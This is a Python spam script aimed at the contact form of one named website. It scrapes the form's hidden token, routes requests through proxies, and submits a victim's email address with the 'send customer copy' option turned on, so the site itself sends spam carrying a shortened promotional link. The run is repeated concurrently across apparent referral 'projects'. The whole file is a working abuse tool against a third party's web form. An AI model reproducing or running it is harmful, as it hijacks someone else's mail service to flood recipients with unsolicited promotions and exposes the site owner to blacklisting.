import re

import requests

import module

url = 'https://mumbaikendal.uk/ourinfo.php'

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}
pattern = re.compile('(?<=<input type="hidden" name="token" value=").*(?=" />)')


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        s = requests.Session()
        s.proxies = self.get_proxies()
        response = s.get(url, headers=headers, timeout=10)
        token = pattern.search(response.text).group()
        data = {
            'name': 'name',
            'email': target,
            'tel': '211325151243',
            'message': self.get_text(),
            'sendCustCopy': '1',
            'token': token,
            'submit': 'Send Message',
        }

        response = s.post(url, headers=headers, data=data, timeout=10)
        return response


if __name__ == '__main__':
    project_name = 'mumbaikendal'
    success_message = 'Message Sent!'

    project = 'allright'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3F5XIJd'
    spam = ConcreteSpam(
        project_name, success_message,
        referal_project_name=project,
        promo_link=promo_link
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently()
